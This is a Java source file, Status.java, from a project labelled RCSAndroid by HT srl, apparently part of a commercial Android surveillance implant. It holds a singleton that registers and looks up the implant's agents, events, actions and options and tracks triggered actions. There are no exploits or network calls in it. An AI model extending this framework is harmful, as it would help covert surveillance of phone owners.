/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI;

import java.util.ArrayList;
import java.util.HashMap;

import com.ht.RCSAndroidGUI.action.Action;
import com.ht.RCSAndroidGUI.agent.Agent;
import com.ht.RCSAndroidGUI.conf.Option;
import com.ht.RCSAndroidGUI.event.Event;

// Singleton Class
public class Status {

	private HashMap<Integer, Agent> agentsMap;
	private HashMap<Integer, Event> eventsMap;
	private HashMap<Integer, Action> actionsMap;
	private HashMap<Integer, Option> optionsMap;

	ArrayList<Integer> triggeredActions = new ArrayList<Integer>();

	public boolean synced;

	public int drift;

	private Status() {
		agentsMap = new HashMap<Integer, Agent>();
		eventsMap = new HashMap<Integer, Event>();
		actionsMap = new HashMap<Integer, Action>();
		optionsMap = new HashMap<Integer, Option>();
	}

	private volatile static Status singleton;

	public static Status self() {
		if (singleton == null) {
			synchronized (Status.class) {
				if (singleton == null) {
					singleton = new Status();
				}
			}
		}

		return singleton;
	}

	public void clean() {
		agentsMap.clear();
		eventsMap.clear();
		actionsMap.clear();
		optionsMap.clear();
	}

	// Add an agent to the map
	public void addAgent(Agent a) throws RCSException {
		// Don't add the same agent twice
		if (agentsMap.containsKey(a.getId()) == true) {
			throw new RCSException("Agent " + a.getId() + " already loaded");
		}

		agentsMap.put(a.getId(), a);
	}

	// Stop an agent
	public void stopAgent(Agent a) throws RCSException {
		if (agentsMap.containsKey(a.getId()) == false) {
			throw new RCSException("Agent " + a.getId()
					+ " cannot be stopped because it doesn't exist");
		}

		Agent agent = agentsMap.get(a.getId());

		if (agent == null)
			return;

		agent.stopAgent();
	}

	// Add an event to the map
	public void addEvent(Event e) throws RCSException {
		// Don't add the same event twice
		if (eventsMap.containsKey(e.getId()) == true) {
			throw new RCSException("Event " + e.getId() + " already loaded");
		}

		eventsMap.put(e.getId(), e);
	}

	// Add an action to the map
	public void addAction(Action a) throws RCSException {
		// Don't add the same action twice
		if (actionsMap.containsKey(a.getId()) == true) {
			throw new RCSException("Action " + a.getId() + " already loaded");
		}

		actionsMap.put(a.getId(), a);
	}

	// Add an option to the map
	public void addOption(Option o) throws RCSException {
		// Don't add the same option twice
		if (optionsMap.containsKey(o.getId()) == true) {
			throw new RCSException("Option " + o.getId() + " already loaded");
		}

		optionsMap.put(o.getId(), o);
	}

	public int getActionsNumber() {
		return actionsMap.size();
	}

	public int getAgentsNumber() {
		return agentsMap.size();
	}

	public int getEventsNumber() {
		return eventsMap.size();
	}

	public int getOptionssNumber() {
		return optionsMap.size();
	}

	public HashMap<Integer, Agent> getAgentsMap() {
		return agentsMap;
	}

	public HashMap<Integer, Event> getEventsMap() {
		return eventsMap;
	}

	public HashMap<Integer, Action> getActionsMap() {
		return actionsMap;
	}

	public Action getAction(int index) throws RCSException {
		if (actionsMap.containsKey(index) == false) {
			throw new RCSException("Action " + index + " not found");
		}

		Action a = actionsMap.get(index);

		if (a == null) {
			throw new RCSException("Action " + index + " is null");
		}

		return a;
	}

	public Agent getAgent(int id) throws RCSException {
		if (agentsMap.containsKey(id) == false) {
			throw new RCSException("Agent " + id + " not found");
		}

		Agent a = agentsMap.get(id);

		if (a == null) {
			throw new RCSException("Agent " + id + " is null");
		}

		return a;
	}

	public Event getEvent(int id) throws RCSException {
		if (eventsMap.containsKey(id) == false) {
			throw new RCSException("Event " + id + " not found");
		}

		Event e = eventsMap.get(id);

		if (e == null) {
			throw new RCSException("Event " + id + " is null");
		}

		return e;
	}

	public Option getOption(int id) throws RCSException {
		if (optionsMap.containsKey(id) == false) {
			throw new RCSException("Option " + id + " not found");
		}

		Option o = optionsMap.get(id);

		if (o == null) {
			throw new RCSException("Option " + id + " is null");
		}

		return o;
	}

	public boolean crisisSync() {
		// TODO Auto-generated method stub
		return false;
	}

	public boolean backlight() {
		// TODO Auto-generated method stub
		return false;
	}

	public void triggerAction(int i) {
		synchronized (triggeredActions) {
			if (!triggeredActions.contains(i)) {
				triggeredActions.add(new Integer(i));
			}
		}
	}

	public int[] getTriggeredActions() {
		synchronized (triggeredActions) {
			int size = triggeredActions.size();
			int[] triggered = new int[size];
			for (int i = 0; i < size; i++) {
				triggered[i] = triggeredActions.get(i);
			}
			return triggered;
		}
	}

	public void unTriggerAction(Action action) {
		synchronized (triggeredActions) {
			if (triggeredActions.contains(action.getId())) {
				triggeredActions.remove(new Integer(action.getId()));
			}
		}
	}

	public void unTriggerAll() {
		synchronized (triggeredActions) {
			triggeredActions.clear();
		}
		
	}

	public void setRestarting(boolean b) {
		// TODO Auto-generated method stub
		
	}
}
